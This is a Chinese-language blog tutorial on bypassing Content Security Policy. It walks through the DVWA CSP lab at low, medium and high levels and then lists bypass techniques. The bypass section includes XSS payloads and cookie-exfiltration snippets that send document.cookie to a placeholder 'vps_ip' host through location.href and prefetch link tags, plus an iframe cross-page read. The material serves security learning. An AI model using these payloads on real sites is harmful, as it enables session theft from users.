@@ -1,0 +1,615 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;5084 CSP是啥，干啥的https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;HTTP&#x2F;CSP内容安全策略，该策略可让网站管理员指定客户端允许加载的各类可信任资源。CSP 兼容的浏览器将只执行从那些允许域接收的源文件中加载的脚本，忽略所有其他脚本（包括内联脚本和事件处理 HTML 属性）。除了限制可以加载内容的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023&#x2F;10&#x2F;12：CSP绕过">
+<meta property="og:url" content="http://example.com/2023/10/12/CSPbypass/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;5084 CSP是啥，干啥的https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;HTTP&#x2F;CSP内容安全策略，该策略可让网站管理员指定客户端允许加载的各类可信任资源。CSP 兼容的浏览器将只执行从那些允许域接收的源文件中加载的脚本，忽略所有其他脚本（包括内联脚本和事件处理 HTML 属性）。除了限制可以加载内容的">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-10-12T11:09:13.000Z">
+<meta property="article:modified_time" content="2023-10-16T13:17:00.196Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>2023/10/12：CSP绕过 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023/10/12：CSP绕过"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-12 19:09" pubdate>
+          October 12, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          85 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2023/10/12：CSP绕过</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5084">https://xz.aliyun.com/t/5084</a></p>
+<h2 id="CSP是啥，干啥的"><a href="#CSP是啥，干啥的" class="headerlink" title="CSP是啥，干啥的"></a>CSP是啥，干啥的</h2><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a><br>内容安全策略，该策略可让网站管理员指定客户端允许加载的各类可信任资源。CSP 兼容的浏览器将只执行从那些允许域接收的源文件中加载的脚本，忽略所有其他脚本（包括内联脚本和事件处理 HTML 属性）。除了限制可以加载内容的域之外，服务器还可以指定允许使用哪些协议，比如全是HTTP<br>CSP 的设计是完全向后兼容的（除了 CSP 版本2在向下兼容中有一些明确提到的不一致之处）。不支持 CSP 的浏览器仍然可以与实现它的服务器一起工作，反之亦然，不支持 CSP 的浏览器忽略它，像往常一样工作，默认为 Web 内容的标准同源策略。如果站点没有提供 CSP 头，浏览器也会使用标准的同源策略。<br>要启用 CSP，需要配置 Web 服务器以返回 Content-Security-Policy HTTP 头。<br><code>&lt;meta&gt;</code>也可以配置CSP：</p>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csp">&lt;meta<br>  http-equiv=&quot;Content-Security-Policy&quot;<br>  content=&quot;<span class="hljs-keyword">default-src</span> <span class="hljs-string">&#x27;self&#x27;</span>; <span class="hljs-keyword">img-src</span> https://*; <span class="hljs-keyword">child-src</span> <span class="hljs-string">&#x27;none&#x27;</span>;&quot; /&gt;<br></code></pre></td></tr></table></figure>
+<p>也可以对数据传输限制：一个完整的数据传输安全策略不仅包括强制使用 HTTPS 进行数据传输，还包括标记所有具有安全属性的 cookie，以及提供从 HTTP 页面自动重定向到其对应的 HTTPS。网站也可以使用 HTTP严格传输安全的 HTTP 头，以确保浏览器只能通过加密通道连接到它们。<br>用CSP时最好在策略包含 default-src 策略指令，这是其他资源类型在没有自己的策略时的备用方法</p>
+<h2 id="以DVWA为例"><a href="#以DVWA为例" class="headerlink" title="以DVWA为例"></a>以DVWA为例</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="hljs-comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span><br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-comment"># These might work if you can&#x27;t create your own for some reason</span><br><span class="hljs-comment"># https://pastebin.com/raw/R570EE00</span><br><span class="hljs-comment"># https://www.toptal.com/developers/hastebin/raw/cezaruzeka</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &lt;script src=&#x27;&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;&#x27;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p>注释有提示在这些网站直接生成js代码，再把生成的连接放入include<br>不过现在似乎用不了</p>
+<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-comment">// Disable XSS protections so that inline alert boxes will work</span><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p>使用了nonce，nonce是一个只被使用一次的任意或非重复的随机数值，不过在这里不会变化<br><code>&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</code>插入这句即可</p>
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>high.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p>high.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">clickButton</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> s = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;script&quot;</span>);<br>    s.<span class="hljs-property">src</span> = <span class="hljs-string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(s);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">solveSum</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;answer&quot;</span> <span class="hljs-keyword">in</span> obj) &#123;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;answer&quot;</span>).<span class="hljs-property">innerHTML</span> = obj[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> solve_button = <span class="hljs-variable language_">document</span>.<span class="hljs-property">getElementById</span> (<span class="hljs-string">&quot;solve&quot;</span>);<br><br><span class="hljs-keyword">if</span> (solve_button) &#123;<br>    solve_button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title function_">clickButton</span>();<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>代码保留了接受include的功能<br>注意到js中<code>s.src = &quot;source/jsonp.php?callback=solveSum&quot;;</code>，根据<code>&lt;p&gt;The page makes a call to &#39; . DVWA_WEB_PAGE_TO_ROOT . &#39;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</code>提示，payload为POST传参<code>&lt;script src=&quot;source/jsonp.php?callback=alert(&#39;111&#39;);&quot;&gt;&lt;/script&gt;</code></p>
+<h2 id="CSP饶过"><a href="#CSP饶过" class="headerlink" title="CSP饶过"></a>CSP饶过</h2><h3 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h3><p>利用条件：可以执行任意JS脚本，但是由于CSP无法数据带外<br>CSP不影响location.href跳转，可以利用此方式将cookie外带传输<br><code>location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</code>可以执行任意JS脚本，但是由于CSP无法数据带外时可以采用此方式</p>
+<h3 id="link标签导致的绕过"><a href="#link标签导致的绕过" class="headerlink" title="link标签导致的绕过"></a>link标签导致的绕过</h3><p>利用条件：可以执行任意JS脚本，但是由于CSP无法数据带外<br>较老版本浏览器可以通过此标签将数据外带</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-comment">&lt;!-- firefox --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;dns-prefetch&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//$</span></span></span><span class="hljs-template-variable">&#123;cookie&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">.vps_ip&quot;</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- chrome --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;prefetch&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//vps_ip?$</span></span></span><span class="hljs-template-variable">&#123;cookie&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>标签写死时：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var link = document.create<span class="hljs-constructor">Element(<span class="hljs-string">&quot;link&quot;</span>)</span>;<br>link.set<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;rel&quot;</span>, <span class="hljs-string">&quot;prefetch&quot;</span>)</span>;<br>link.set<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;href&quot;</span>, <span class="hljs-string">&quot;//vps_ip/?&quot;</span> + <span class="hljs-params">document</span>.<span class="hljs-params">cookie</span>)</span>;<br>document.head.append<span class="hljs-constructor">Child(<span class="hljs-params">link</span>)</span>;<br></code></pre></td></tr></table></figure>
+<h3 id="Iframe绕过"><a href="#Iframe绕过" class="headerlink" title="Iframe绕过"></a>Iframe绕过</h3><p>利用条件：一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞；我们需要的数据在存在CSP保护的页面<br>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效<br>A：</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-comment">&lt;!-- A页面 --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;flag&quot;</span>&gt;</span>flag</span><span class="hljs-template-variable">&#123;0xffff&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>B:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- B页面 --&gt;</span><br><br><span class="hljs-comment">&lt;!-- 下面模拟XSS --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;iframe&#x27;</span>);<span class="hljs-comment">//创建对象</span></span><br><span class="language-javascript">iframe.<span class="hljs-property">src</span>=<span class="hljs-string">&quot;A页面&quot;</span>;<span class="hljs-comment">//src定义在iframe显示的网页地址</span></span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(iframe);<span class="hljs-comment">//将新创建的 HTML 元素或已有的元素添加到页面主体&lt;body&gt; </span></span><br><span class="language-javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span><span class="hljs-title function_">alert</span>(iframe.<span class="hljs-property">contentWindow</span>.<span class="hljs-property">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;flag&#x27;</span>).<span class="hljs-property">innerHTML</span>),<span class="hljs-number">1000</span>);<span class="hljs-comment">//setTimeout是为了等待iframe加载完成，innerHTML读写元素内容</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><p>利用条件：CDN服务商存在某些低版本的js库；此CDN服务商在CSP白名单中<br>如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险，例如低版本的angular js模板注入来绕过CSP<br><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p>
+<h3 id="站点可控静态资源绕过"><a href="#站点可控静态资源绕过" class="headerlink" title="站点可控静态资源绕过"></a>站点可控静态资源绕过</h3><p>利用条件：站点存在可控静态资源，站点在CSP白名单中<br><a target="_blank" rel="noopener" href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md">https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md</a><br>利用其他站点下可控静态资源，且CSP允许，类似DVWA low</p>
+<h3 id="站点可控JSONP绕过"><a href="#站点可控JSONP绕过" class="headerlink" title="站点可控JSONP绕过"></a>站点可控JSONP绕过</h3><p>利用条件：站点存在可控Jsonp，站点在CSP白名单中<br>大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析</p>
